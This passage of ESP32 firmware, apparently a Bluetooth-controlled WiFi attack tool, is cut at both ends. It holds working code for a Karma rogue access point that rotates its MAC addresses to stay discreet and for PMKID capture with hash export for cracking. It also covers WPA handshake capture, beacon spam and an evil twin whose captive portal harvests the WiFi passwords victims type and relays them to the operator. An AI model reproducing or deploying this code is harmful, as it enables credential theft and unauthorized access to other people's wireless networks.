    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.mode(WIFI_STA);

    StaticJsonBuffer<256> jb;
    JsonObject &r = jb.createObject();
    r["status"]        = "portal_stopped";
    r["creds_captured"]= portalCredCount;
    String o; r.printTo(o); bleSendStr(o);
    Serial.printf("[PORTAL] Stopped. Creds: %d\n", portalCredCount);
}

void karmaSendProbeResp(const uint8_t *da,
                         const uint8_t *bssid,
                         const char *ssid, int ch) {
    int sl = strlen(ssid);
    if (sl > 32) sl = 32;

    // AMELIORATION 3 — nouvelle MAC aleatoire a chaque reponse
    uint8_t fakeBssid[6];
    fakeBssid[0] = 0x02;
    for (int i = 1; i < 6; i++)
        fakeBssid[i] = (uint8_t)esp_random();

    uint8_t frame[128]; int p=0;
    frame[p++]=0x50; frame[p++]=0x00;
    frame[p++]=0x00; frame[p++]=0x00;
    memcpy(frame+p,da,6);       p+=6;  // dst = station
    memcpy(frame+p,fakeBssid,6);p+=6;  // src = fake MAC
    memcpy(frame+p,fakeBssid,6);p+=6;  // bssid = fake MAC
    frame[p++]=0x00; frame[p++]=0x00;
    uint64_t ts=esp_timer_get_time();
    memcpy(frame+p,&ts,8); p+=8;
    frame[p++]=0x64; frame[p++]=0x00;
    frame[p++]=0x01; frame[p++]=0x04;
    frame[p++]=0x00; frame[p++]=(uint8_t)sl;
    memcpy(frame+p,ssid,sl); p+=sl;
    frame[p++]=0x01; frame[p++]=0x08;
    frame[p++]=0x82; frame[p++]=0x84;
    frame[p++]=0x8B; frame[p++]=0x96;
    frame[p++]=0x24; frame[p++]=0x30;
    frame[p++]=0x48; frame[p++]=0x6C;
    frame[p++]=0x03; frame[p++]=0x01;
    frame[p++]=(uint8_t)ch;

    // Une seule reponse par probe — AMELIORATION 2
    esp_wifi_80211_tx(WIFI_IF_STA, frame, p, false);
}

static void IRAM_ATTR karmaCB(void *buf,
                               wifi_promiscuous_pkt_type_t type) {
    if (!karmaActive) return;
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *data = pkt->payload;
    int     len   = pkt->rx_ctrl.sig_len;
    int8_t  rssi  = pkt->rx_ctrl.rssi;

    if (len < 24) return;
    if ((data[0] & 0xFC) != 0x40) return;

    char ssid[33] = {0};
    uint8_t *sta  = &data[10];
    int p = 24;
    while (p < len-2) {
        uint8_t eid  = data[p];
        uint8_t elen = data[p+1];
        if (p+2+elen > len) break;
        if (eid==0 && elen>0 && elen<=32) {
            memcpy(ssid, &data[p+2], elen);
            ssid[elen] = '\0';
            break;
        }
        p += 2+elen;
        if (!elen) break;
    }
    if (!ssid[0]) return;

    // AMELIORATION 4 — eviter doublons dans 2s
    static uint8_t lastStaMac[6] = {0};
    static char    lastSsid[33]  = {0};
    static unsigned long lastProbeMs = 0;

    bool isDup = (memcmp(sta, lastStaMac, 6) == 0 &&
                  strcmp(ssid, lastSsid) == 0 &&
                  (millis() - lastProbeMs) < 2000);
    if (isDup) return;

    memcpy(lastStaMac, sta, 6);
    strncpy(lastSsid, ssid, 32);
    lastSsid[32] = '\0';
    lastProbeMs  = millis();

    // Stocker dans queue — PAS de TX depuis IRAM
    int next = (karmaQueueHead + 1) % KARMA_QUEUE_SIZE;
    if (next != karmaQueueTail) {
        KarmaProbe *kp  = &karmaQueue[karmaQueueHead];
        memcpy(kp->sta_mac, sta, 6);
        memset(kp->bssid,   0,   6);
        strncpy(kp->ssid, ssid, 32);
        kp->ssid[32] = '\0';
        kp->rssi     = rssi;
        kp->valid    = true;
        karmaQueueHead = next;
    }
}

void karmaTick() {
    if (!karmaActive) return;

    // Traiter la queue — TX depuis loop() pas IRAM
    while (karmaQueueTail != karmaQueueHead) {
        KarmaProbe *kp = &karmaQueue[karmaQueueTail];
        if (kp->valid) {
            kp->valid = false;

            // Trouver ou ajouter le SSID
            int idx = -1;
            for (int i=0; i<karmaCount; i++) {
                if (strcmp(karmaEntries[i].ssid, kp->ssid)==0) {
                    idx=i; break;
                }
            }
            if (idx < 0 && karmaCount < KARMA_MAX_SSIDS) {
                idx = karmaCount++;
                strncpy(karmaEntries[idx].ssid, kp->ssid, 32);
                randomMac(karmaEntries[idx].bssid);
                karmaEntries[idx].active = true;
            }

            if (idx >= 0) {
                karmaEntries[idx].rssi = kp->rssi;

                // AMELIORATION 2 — une seule Probe Response
                // AMELIORATION 3 — MAC aleatoire par reponse
                karmaSendProbeResp(kp->sta_mac,
                                   karmaEntries[idx].bssid,
                                   kp->ssid,
                                   karmaChannel);

                // Notifier BLE
                char mac_str[18];
                snprintf(mac_str, sizeof(mac_str),
                    "%02X:%02X:%02X:%02X:%02X:%02X",
                    kp->sta_mac[0], kp->sta_mac[1],
                    kp->sta_mac[2], kp->sta_mac[3],
                    kp->sta_mac[4], kp->sta_mac[5]);

                StaticJsonBuffer<256> jb;
                JsonObject &r = jb.createObject();
                r["status"] = "karma_probe";
                r["mac"]    = mac_str;
                r["ssid"]   = kp->ssid;
                r["rssi"]   = (int)kp->rssi;
                String o; r.printTo(o); bleSendStr(o);

                Serial.printf("[KARMA] %s -> '%s'\n",
                    mac_str, kp->ssid);
            }
        }
        karmaQueueTail = (karmaQueueTail + 1) % KARMA_QUEUE_SIZE;
    }

    // AMELIORATION 1 — Beacons moins frequents (discret)
    // AMELIORATION 4 — MAC differente par beacon
    if (millis()-karmaLast < (KARMA_BEACON_INTERVAL_MS * 5)) return;
    karmaLast = millis();

    for (int i=0; i<karmaCount; i++) {
        if (!karmaEntries[i].active) continue;
        // Nouvelle MAC aleatoire pour chaque beacon
        uint8_t fakeMac[6];
        fakeMac[0] = 0x02;
        for (int m=1; m<6; m++)
            fakeMac[m] = (uint8_t)esp_random();
        uint8_t frame[128]; int flen=0;
        buildBeaconFrame(frame, &flen,
                         fakeMac,
                         karmaEntries[i].ssid,
                         karmaChannel);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
        delay(2);
    }
}

void startKarma(int channel) {
    karmaCount   = 0;
    karmaActive  = true;
    karmaChannel = channel;
    karmaLast    = 0;
    memset(karmaEntries, 0, sizeof(karmaEntries));

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&karmaCB);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    char msg[64];
    snprintf(msg, sizeof(msg),
             "Karma started on channel %d", channel);
    bleNotify("ok", msg);
}

void stopKarma() {
    karmaActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    StaticJsonBuffer<256> jb;
    JsonObject &r=jb.createObject();
    r["status"]="ok"; r["cmd"]="karma";
    r["message"]="stopped";
    r["probes_seen"]=karmaCount;
    String o; r.printTo(o); bleSendStr(o);
}


// ============================================================
//  CHANNEL HOPPING SNIFFER
// ============================================================
void hopTick() {
    if (!hopActive) return;
    if (millis() - hopLast < HOP_INTERVAL_MS) return;
    hopLast = millis();

    hopChannel++;
    if (hopChannel > HOP_MAX_CHANNEL)
        hopChannel = HOP_MIN_CHANNEL;

    esp_wifi_set_channel(hopChannel, WIFI_SECOND_CHAN_NONE);

    static int hopCycle = 0;
    hopCycle++;
    if (hopCycle % 13 == 0) {
        StaticJsonBuffer<256> jb;
        JsonObject &r = jb.createObject();
        r["status"]   = "hop_stats";
        r["channel"]  = hopChannel;
        r["total"]    = snifMgmt + snifData + snifCtrl;
        r["aps"]      = apCount;
        r["clients"]  = staCount;
        r["probes"]   = probeCount;
        r["uptime_s"] = (millis() - snifStart) / 1000;
        String o; r.printTo(o); bleSendStr(o);
    }
}

void startHopSniffer() {
    apCount=0; staCount=0; probeCount=0; eventCount=0;
    snifMgmt=0; snifData=0; snifCtrl=0;
    memset(aps,0,sizeof(aps));
    memset(stations,0,sizeof(stations));
    memset(probes,0,sizeof(probes));
    memset(events,0,sizeof(events));

    hopChannel    = HOP_MIN_CHANNEL;
    hopActive     = true;
    hopLast       = 0;
    snifStart     = millis();
    snifHasFilter = false;
    snifActive    = true;

    esp_wifi_set_promiscuous(false);
    delay(50);
    esp_wifi_set_channel(hopChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&snifferCB);

    attack_running = true;
    strncpy(current_attack, "hop_sniffer", sizeof(current_attack)-1);
    bleNotify("ok", "Channel hopping sniffer started ch=1-13");
    Serial.println("[HOP] Started");
}

void stopHopSniffer() {
    hopActive  = false;
    snifActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    Serial.println("[HOP] Stopped");
    sendSnifferReport();
    attack_running = false;
}

// ============================================================
//  PMKID CAPTURE
// ============================================================
static void IRAM_ATTR pmkidCB(void *buf,
                               wifi_promiscuous_pkt_type_t type) {
    if (!pmkidActive) return;
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *data = pkt->payload;
    uint16_t len  = pkt->rx_ctrl.sig_len;

    if (len < 36) return;

    uint8_t ft  = data[0] & 0xFC;
    uint8_t *a2 = &data[10];
    uint8_t *a3 = &data[16];

    if (!pmkidAllBSSID) {
        if (!macMatch(a3, pmkidBSSID) &&
            !macMatch(a2, pmkidBSSID)) return;
    }

    // Chercher RSN IE (tag 48) dans beacons et assoc
    if (ft != 0x80 && ft != 0x00 && ft != 0x20) return;

    int ieStart = (ft == 0x80) ? 36 : 28;
    int p = ieStart;
    char ssid[33] = {0};

    while (p < (int)len - 2) {
        uint8_t eid  = data[p];
        uint8_t elen = data[p+1];
        if (p + 2 + elen > (int)len) break;

        if (eid == 0 && elen > 0 && elen <= 32) {
            memcpy(ssid, &data[p+2], elen);
            ssid[elen] = '\0';
        }

        if (eid == 48 && elen >= 20) {
            uint8_t *rsn = &data[p+2];
            int rp = 2 + 4; // version + group cipher
            if (rp + 2 > elen) { p += 2+elen; continue; }
            uint16_t pc = rsn[rp] | (rsn[rp+1]<<8);
            rp += 2 + pc*4;
            if (rp + 2 > elen) { p += 2+elen; continue; }
            uint16_t ac = rsn[rp] | (rsn[rp+1]<<8);
            rp += 2 + ac*4;
            if (rp + 2 > elen) { p += 2+elen; continue; }
            rp += 2; // RSN capabilities
            if (rp + 2 > elen) { p += 2+elen; continue; }
            uint16_t pmkid_cnt = rsn[rp] | (rsn[rp+1]<<8);
            rp += 2;
            if (pmkid_cnt > 0 && rp + 16 <= elen) {
                if (pmkidCount < MAX_PMKID) {
                    PmkidEntry *pe = &pmkids[pmkidCount];
                    memcpy(pe->bssid, a3, 6);
                    memcpy(pe->client, a2, 6);
                    memcpy(pe->pmkid, &rsn[rp], 16);
                    strncpy(pe->ssid, ssid, 32);
                    pe->valid = true;
                    pmkidCount++;
                    Serial.printf("[PMKID] Found! %s\n", ssid);
                }
            }
        }
        p += 2 + elen;
        if (elen == 0) break;
    }
}

void startPMKID(const uint8_t *bssid, int channel) {
    pmkidCount  = 0;
    pmkidActive = true;
    pmkidStart  = millis();
    memset(pmkids, 0, sizeof(pmkids));

    if (bssid && !macIsZero(bssid)) {
        memcpy(pmkidBSSID, bssid, 6);
        pmkidAllBSSID = false;
    } else {
        memset(pmkidBSSID, 0, 6);
        pmkidAllBSSID = true;
    }

    esp_wifi_set_promiscuous(false);
    delay(50);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&pmkidCB);

    attack_running = true;
    strncpy(current_attack, "pmkid", sizeof(current_attack)-1);

    char msg[64];
    snprintf(msg, sizeof(msg), "PMKID capture started ch=%d", channel);
    bleNotify("ok", msg);
    Serial.printf("[PMKID] Started ch=%d\n", channel);
}

void stopPMKID() {
    pmkidActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    Serial.printf("[PMKID] Stopped. Found %d\n", pmkidCount);

    for (int i = 0; i < pmkidCount; i++) {
        PmkidEntry *pe = &pmkids[i];
        char pmkid_hex[33] = {0};
        char bssid_hex[13] = {0};
        char client_hex[13]= {0};
        char ssid_hex[65]  = {0};

        for (int j=0; j<16; j++)
            sprintf(&pmkid_hex[j*2], "%02x", pe->pmkid[j]);
        for (int j=0; j<6; j++)
            sprintf(&bssid_hex[j*2], "%02x", pe->bssid[j]);
        for (int j=0; j<6; j++)
            sprintf(&client_hex[j*2], "%02x", pe->client[j]);
        for (int j=0; j<(int)strlen(pe->ssid); j++)
            sprintf(&ssid_hex[j*2], "%02x", (uint8_t)pe->ssid[j]);

        char hash[256];
        snprintf(hash, sizeof(hash),
            "WPA*01*%s*%s*%s*%s***",
            pmkid_hex, bssid_hex, client_hex, ssid_hex);

        StaticJsonBuffer<512> jb;
        JsonObject &r = jb.createObject();
        r["status"]   = "pmkid_found";
        r["index"]    = i;
        r["bssid"]    = macToStr(pe->bssid);
        r["client"]   = macToStr(pe->client);
        r["ssid"]     = pe->ssid;
        r["pmkid"]    = pmkid_hex;
        r["hash"]     = hash;
        String o; r.printTo(o); bleSendStr(o);
        delay(50);
    }

    {
        StaticJsonBuffer<256> jb;
        JsonObject &r = jb.createObject();
        r["status"]   = "pmkid_complete";
        r["found"]    = pmkidCount;
        String o; r.printTo(o); bleSendStr(o);
    }
    attack_running = false;
}

// ============================================================
//  EVIL TWIN (Rogue AP)
// ============================================================
static WebServer   *twinWebServer = nullptr;
static DNSServer   *twinDNS       = nullptr;

static void twinHandleRoot() {
    char page[2048];
    snprintf(page, sizeof(page), PORTAL_HTML_TPL, twinSSID);
    twinWebServer->send(200, "text/html", page);
}

static void twinHandleLogin() {
    String pass = "";
    if (twinWebServer->hasArg("password"))
        pass = twinWebServer->arg("password");
    String clientIP = twinWebServer->client().remoteIP().toString();

    Serial.printf("[TWIN] Pass: %s from %s\n",
        pass.c_str(), clientIP.c_str());

    StaticJsonBuffer<512> jb;
    JsonObject &r = jb.createObject();
    r["status"]    = "twin_cred";
    r["ssid"]      = twinSSID;
    r["password"]  = pass;
    r["client_ip"] = clientIP;
    String o; r.printTo(o); bleSendStr(o);

    twinWebServer->send(200, "text/html", PORTAL_SUCCESS);
}

static void twinHandleCaptive() {
    twinWebServer->sendHeader("Location", "http://192.168.4.1/");
    twinWebServer->send(302, "text/plain", "");
}

static void twinHandleNotFound() {
    twinWebServer->sendHeader("Location", "http://192.168.4.1/");
    twinWebServer->send(302, "text/plain", "");
}

void startEvilTwin(const char *ssid, const uint8_t *bssid,
                   int channel, const char *pass) {
    if (twinActive) return;

    strncpy(twinSSID, ssid, 32);
    twinSSID[32] = '\0';
    memcpy(twinBSSID, bssid, 6);
    twinChannel = channel;

    WiFi.mode(WIFI_AP_STA);
    delay(100);
    if (pass && strlen(pass) >= 8)
        WiFi.softAP(ssid, pass, channel, 0, TWIN_MAX_CLIENTS);
    else
        WiFi.softAP(ssid, nullptr, channel, 0, TWIN_MAX_CLIENTS);

    IPAddress ip(192,168,4,1), gw(192,168,4,1), nm(255,255,255,0);
    WiFi.softAPConfig(ip, gw, nm);
    delay(300);

    twinDNS = new DNSServer();
    twinDNS->setErrorReplyCode(DNSReplyCode::NoError);
    twinDNS->start(53, "*", ip);

    twinWebServer = new WebServer(80);
    twinWebServer->on("/", HTTP_GET, twinHandleRoot);
    twinWebServer->on("/login", HTTP_POST, twinHandleLogin);
    twinWebServer->on("/generate_204", twinHandleCaptive);
    twinWebServer->on("/gen_204", twinHandleCaptive);
    twinWebServer->on("/hotspot-detect.html", twinHandleCaptive);
    twinWebServer->on("/canonical.html", twinHandleCaptive);
    twinWebServer->on("/success.txt", twinHandleCaptive);
    twinWebServer->on("/ncsi.txt", twinHandleCaptive);
    twinWebServer->on("/connecttest.txt", twinHandleCaptive);
    twinWebServer->on("/fwlink", twinHandleCaptive);
    twinWebServer->onNotFound(twinHandleNotFound);
    twinWebServer->begin();

    twinActive     = true;
    attack_running = true;
    strncpy(current_attack, "evil_twin", sizeof(current_attack)-1);

    char msg[128];
    snprintf(msg, sizeof(msg), "Evil Twin started SSID=%s ch=%d",
        ssid, channel);
    bleNotify("ok", msg);
    Serial.printf("[TWIN] Started: %s ch=%d\n", ssid, channel);
}

void stopEvilTwin() {
    if (!twinActive) return;
    twinActive = false;

    if (twinWebServer) {
        twinWebServer->stop();
        delete twinWebServer;
        twinWebServer = nullptr;
    }
    if (twinDNS) {
        twinDNS->stop();
        delete twinDNS;
        twinDNS = nullptr;
    }

    delay(200);
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.mode(WIFI_STA);

    StaticJsonBuffer<256> jb;
    JsonObject &r = jb.createObject();
    r["status"]        = "twin_stopped";
    r["ssid"]          = twinSSID;
    String o; r.printTo(o); bleSendStr(o);

    Serial.println("[TWIN] Stopped");
    attack_running = false;
}

// ============================================================
//  Stop all
// ============================================================
void stopAll() {
    if (snifActive || hopActive) {
        if (hopActive) stopHopSniffer();
        else stopSniffer();
    }
    if (pmkidActive)  stopPMKID();
    if (hsActive)     stopHandshake();
    if (beaconActive) stopBeacon();
    if (portalActive) stopPortal();
    if (twinActive)   stopEvilTwin();
    if (karmaActive)  stopKarma();
    hopActive      = false;
    attack_running = false;
    memset(current_attack, 0, sizeof(current_attack));
}

// ============================================================
//  Command Router
// ============================================================
void processCommand(const char *json_str) {
    StaticJsonBuffer<512> jb;
    JsonObject &root = jb.parseObject(json_str);

    if (!root.success()) {
        bleNotify("error", "Invalid JSON"); return;
    }

    // Auth
    if (!authenticated) {
        if (root.containsKey("pin")) {
            if (strcmp(root["pin"].as<const char*>(),
                       AUTH_PIN) == 0) {
                authenticated = true;
                authAttempts  = 0;
                bleNotify("auth_ok", "Access granted");
            } else {
                authAttempts++;
                StaticJsonBuffer<256> jb2;
                JsonObject &r=jb2.createObject();
                r["status"]="auth_failed";
                r["attempts_left"]=AUTH_MAX_ATTEMPTS-authAttempts;
                String o; r.printTo(o); bleSendStr(o);
                if (authAttempts >= AUTH_MAX_ATTEMPTS) {
                    delay(500);
                    pServer->disconnect(0);
                }
            }
        } else {
            bleNotify("auth_required", "Send pin");
        }
        return;
    }

    if (!root.containsKey("cmd")) {
        bleNotify("error", "Missing cmd"); return;
    }

    const char *cmd = root["cmd"].as<const char*>();

    // ── STOP ─────────────────────────────────────────────
    if (strcmp(cmd,"stop")==0) {
        stopAll();
        bleNotify("ok", "All stopped");
        return;
    }

    // ── STATUS ───────────────────────────────────────────
    if (strcmp(cmd,"status")==0) {
        StaticJsonBuffer<512> jb2;
        JsonObject &r=jb2.createObject();
        r["status"]="ok";
        r["free_heap"]=ESP.getFreeHeap();
        r["uptime_ms"]=millis();
        r["attack"]=attack_running?current_attack:"none";
        r["sniffer"]    = snifActive;
        r["hop_sniffer"]= hopActive;
        r["pmkid"]      = pmkidActive;
        r["handshake"]  = hsActive;
        r["beacon"]     = beaconActive;
        r["portal"]     = portalActive;
        r["evil_twin"]  = twinActive;
        r["karma"]      = karmaActive;
        String o; r.printTo(o); bleSendStr(o);
        return;
    }

    // ── SCAN ─────────────────────────────────────────────
    if (strcmp(cmd,"scan")==0) {
        doScan(); return;
    }

    // ── SNIFFER ──────────────────────────────────────────
    if (strcmp(cmd,"sniffer")==0) {
        stopAll();
        apCount=0; staCount=0; probeCount=0; eventCount=0;
        snifMgmt=0; snifData=0; snifCtrl=0;
        memset(aps,0,sizeof(aps));
        memset(stations,0,sizeof(stations));
        memset(probes,0,sizeof(probes));
        memset(events,0,sizeof(events));

        snifChan = root.containsKey("channel")?
                   (uint8_t)root["channel"].as<int>():1;
        snifHasFilter = false;
        if (root.containsKey("bssid")) {
            parseMac(root["bssid"].as<const char*>(),
                     snifFilterBSSID);
            snifHasFilter = true;
        }

        snifActive = true;
        snifStart  = millis();
        attack_running = true;
        strncpy(current_attack,"sniffer",
                sizeof(current_attack)-1);

        esp_wifi_set_channel(snifChan, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&snifferCB);

        char msg[64];
        snprintf(msg,sizeof(msg),
                 "Sniffer started ch=%d", snifChan);
        bleNotify("ok", msg);
        return;
    }

    // ── SNIFFER REPORT ───────────────────────────────────
    if (strcmp(cmd,"sniffer_report")==0) {
        stopSniffer();
        delay(100);
        sendSnifferReport();
        return;
    }

    // ── HANDSHAKE ────────────────────────────────────────
    if (strcmp(cmd,"handshake")==0) {
        if (!root.containsKey("bssid")) {
            bleNotify("error","Missing bssid"); return;
        }
        stopAll();
        parseMac(root["bssid"].as<const char*>(), hsBSSID);
        hsChannel = root.containsKey("channel")?
                    (uint8_t)root["channel"].as<int>():1;

        hsFrameCount=0; hsEapolCount=0;
        hsBeaconCount=0; hsAuthCount=0; hsAssocCount=0;
        hsM1=hsM2=hsM3=hsM4=false;
        hsActive=true; hsStart=millis();
        attack_running=true;
        strncpy(current_attack,"handshake",
                sizeof(current_attack)-1);

        esp_wifi_set_channel(hsChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&handshakeCB);

        char msg[64];
        snprintf(msg,sizeof(msg),
                 "Handshake capture started ch=%d", hsChannel);
        bleNotify("ok", msg);
        return;
    }

    // FIX 5 — handshake_send pour envoyer les frames
    if (strcmp(cmd,"handshake_send")==0) {
        stopHandshake();
        delay(200);

        bool captured = (hsEapolCount >= 4);
        {
            StaticJsonBuffer<256> jb2;
            JsonObject &r=jb2.createObject();
            r["status"]=captured?"handshake_captured":"ok";
            r["captured"]=captured;
            r["eapol_frames"]=hsEapolCount;
            r["total_frames"]=hsFrameCount;
            r["bssid"]=macToStr(hsBSSID);
            String o; r.printTo(o); bleSendStr(o);
        }
        delay(200);
        if (hsFrameCount > 0) sendCapturedFrames();
        attack_running=false;
        return;
    }

    // ── BEACON SPAM ──────────────────────────────────────
    if (strcmp(cmd,"beacon")==0) {
        stopAll();
        beaconCount=0; beaconIdx=0;
        memset(beacons,0,sizeof(beacons));

        beaconChannel = root.containsKey("channel")?
                        root["channel"].as<int>():1;

        if (root.containsKey("mode") &&
            strcmp(root["mode"].as<const char*>(),"random")==0) {
            int n = root.containsKey("count")?
                    root["count"].as<int>():20;
            if (n > MAX_BEACONS) n = MAX_BEACONS;
            for (int i=0; i<n; i++) {
                char ssid[BEACON_RANDOM_SSID_LEN+1];
                randomSSID(ssid, BEACON_RANDOM_SSID_LEN);
                strncpy(beacons[i].ssid, ssid, 32);
                randomMac(beacons[i].bssid);
                beacons[i].in_use = true;
                beaconCount++;
            }
        } else if (root.containsKey("ssids")) {
            JsonArray &arr = root["ssids"];
            for (auto &s : arr) {
                if (beaconCount >= MAX_BEACONS) break;
                strncpy(beacons[beaconCount].ssid,
                        s.as<const char*>(), 32);
                randomMac(beacons[beaconCount].bssid);
                beacons[beaconCount].in_use = true;
                beaconCount++;
            }
        } else {
            bleNotify("error","Missing ssids or mode");
            return;
        }

        if (beaconCount == 0) {
            bleNotify("error","No SSIDs");
            return;
        }

        beaconActive = true;
        beaconLast   = 0;
        esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);
        attack_running = true;
        strncpy(current_attack,"beacon",
                sizeof(current_attack)-1);

        char msg[64];
        snprintf(msg,sizeof(msg),
                 "Beacon spam started %d SSIDs ch=%d",
                 beaconCount, beaconChannel);
        bleNotify("ok", msg);
        return;
    }

    // ── EVIL PORTAL ──────────────────────────────────────
    if (strcmp(cmd,"portal")==0) {
        stopAll();
        const char *ssid = root.containsKey("ssid")?
                           root["ssid"].as<const char*>():
                           PORTAL_AP_SSID;
        const char *pass = root.containsKey("password")?
                           root["password"].as<const char*>():
                           nullptr;
        int ch = root.containsKey("channel")?
                 root["channel"].as<int>():PORTAL_AP_CHANNEL;
        attack_running = true;
        strncpy(current_attack,"portal",
                sizeof(current_attack)-1);
        startPortal(ch, ssid, pass);
        return;
    }

    // ── KARMA ────────────────────────────────────────────
    if (strcmp(cmd,"karma")==0) {
        stopAll();
        int ch = root.containsKey("channel")?
                 root["channel"].as<int>():1;
        attack_running = true;
        strncpy(current_attack,"karma",
                sizeof(current_attack)-1);
        startKarma(ch);
        return;
    }


    // ── CHANNEL HOPPING ──────────────────────────────────
    if (strcmp(cmd,"hop_sniffer")==0) {
        stopAll();
        startHopSniffer();
        return;
    }

    // ── PMKID ────────────────────────────────────────────
    if (strcmp(cmd,"pmkid")==0) {
        stopAll();
        uint8_t bssid[6] = {0};
        bool hasBSSID = false;
        if (root.containsKey("bssid")) {
            parseMac(root["bssid"].as<const char*>(), bssid);
            hasBSSID = true;
        }
        int ch = root.containsKey("channel")?
                 root["channel"].as<int>():1;
        startPMKID(hasBSSID ? bssid : nullptr, ch);
        return;
    }

    // ── PMKID STOP ───────────────────────────────────────
    if (strcmp(cmd,"pmkid_stop")==0) {
        stopPMKID();
        return;
    }

    // ── EVIL TWIN ────────────────────────────────────────
    if (strcmp(cmd,"evil_twin")==0) {
        if (!root.containsKey("ssid")) {
            bleNotify("error","Missing ssid"); return;
        }
        stopAll();
        const char *ssid = root["ssid"].as<const char*>();
        uint8_t bssid[6] = {0};
        if (root.containsKey("bssid"))
            parseMac(root["bssid"].as<const char*>(), bssid);
        int ch = root.containsKey("channel")?
                 root["channel"].as<int>():6;
        const char *pass = root.containsKey("password")?
                           root["password"].as<const char*>():
                           nullptr;
        startEvilTwin(ssid, bssid, ch, pass);
        return;
    }

    bleNotify("error", "Unknown command");
}

// ============================================================
//  BLE Callbacks
// ============================================================
class ServerCB : public BLEServerCallbacks {
    void onConnect(BLEServer *s) override {
        deviceConnected = true;
        authenticated   = false;
        authAttempts    = 0;
        authStart       = millis();
        Serial.printf("[BLE] Connected id=%d\n", s->getConnId());
        delay(600);
        bleNotify("auth_required",
                  "Send {\"pin\":\"XXXX\"} within 30s");
    }
    void onDisconnect(BLEServer *s) override {
        deviceConnected = false;
        authenticated   = false;
        authAttempts    = 0;
        Serial.println("[BLE] Disconnected");
        delay(500);
        BLEDevice::startAdvertising();
    }
};

class CmdCB : public BLECharacteristicCallbacks {
    void onWrite(BLECharacteristic *pChar) override {
        std::string val = pChar->getValue();
        if (val.length() > 0) {
            Serial.println(("[CMD] " + val).c_str());
            processCommand(val.c_str());
        }
    }
};

// ============================================================
//  Setup
// ============================================================
void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n[BOOT] Red ESP32 starting...");
    Serial.printf("[BOOT] Heap: %d\n", ESP.getFreeHeap());

    esp_task_wdt_init(30, true);

    // WiFi init
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(100);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    Serial.println("[BOOT] WiFi ready");

    // MAC WiFi aleatoire au lancement
    {
        uint8_t mac[6];
        mac[0] = 0x02; // locally administered
        for (int i = 1; i < 6; i++)
            mac[i] = (uint8_t)esp_random();
        esp_wifi_set_mac(WIFI_IF_STA, mac);
        Serial.printf("[BOOT] MAC randomisee: "
            "%02X:%02X:%02X:%02X:%02X:%02X\n",
            mac[0],mac[1],mac[2],
            mac[3],mac[4],mac[5]);
    }

    // BLE init
    BLEDevice::init(DEVICE_NAME);
    BLEDevice::setMTU(512);

    pServer = BLEDevice::createServer();
    pServer->setCallbacks(new ServerCB());

    BLEService *pSvc = pServer->createService(SERVICE_UUID);

    pCmdChar = pSvc->createCharacteristic(
        CHAR_CMD_UUID,
        BLECharacteristic::PROPERTY_WRITE |
        BLECharacteristic::PROPERTY_WRITE_NR);
    pCmdChar->setCallbacks(new CmdCB());

    pRspChar = pSvc->createCharacteristic(
        CHAR_RSP_UUID,
        BLECharacteristic::PROPERTY_NOTIFY |
        BLECharacteristic::PROPERTY_READ);
    pRspChar->addDescriptor(new BLE2902());

    pSvc->start();

    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
    pAdv->addServiceUUID(SERVICE_UUID);
    pAdv->setScanResponse(true);
    pAdv->setMinPreferred(0x06);
    pAdv->setMinPreferred(0x12);
    BLEDevice::startAdvertising();

    Serial.printf("[BOOT] BLE: %s\n", DEVICE_NAME);
    Serial.println("[BOOT] READY\n");
}

// ============================================================
//  Loop
// ============================================================
void loop() {
    // Auth timeout
    if (deviceConnected && !authenticated) {
        if (millis() - authStart > AUTH_TIMEOUT_MS) {
            Serial.println("[AUTH] Timeout");
            authenticated = false;
            pServer->disconnect(0);
            authStart = millis();
        }
    }

    // BLE reconnexion
    if (!deviceConnected && oldDeviceConnected) {
        delay(300);
        BLEDevice::startAdvertising();
        oldDeviceConnected = deviceConnected;
    }
    if (deviceConnected && !oldDeviceConnected) {
        oldDeviceConnected = deviceConnected;
    }

    // Portal tick — DNS + WebServer
    if (portalActive) {
        if (portalDNS) portalDNS->processNextRequest();
        if (portalWebServer) portalWebServer->handleClient();
    }

    // Evil Twin tick
    if (twinActive) {
        if (twinDNS) twinDNS->processNextRequest();
        if (twinWebServer) twinWebServer->handleClient();
    }

    // Channel Hopping tick
    if (hopActive) hopTick();

    // PMKID timeout auto-stop
    static unsigned long lastPmkidCheck = 0;
    if (pmkidActive && millis()-lastPmkidCheck > 2000) {
        lastPmkidCheck = millis();
        if (millis()-pmkidStart > PMKID_TIMEOUT) {
            Serial.println("[PMKID] Timeout");
            stopPMKID();
        }
        // Notifier progress
        StaticJsonBuffer<128> jb;
        JsonObject &r=jb.createObject();
        r["status"]="pmkid_progress";
        r["found"]=pmkidCount;
        r["elapsed_s"]=(millis()-pmkidStart)/1000;
        String o; r.printTo(o); bleSendStr(o);
    }

    // Portal tick — DNS + WebServer
    if (portalActive) {
        if (portalDNS) portalDNS->processNextRequest();
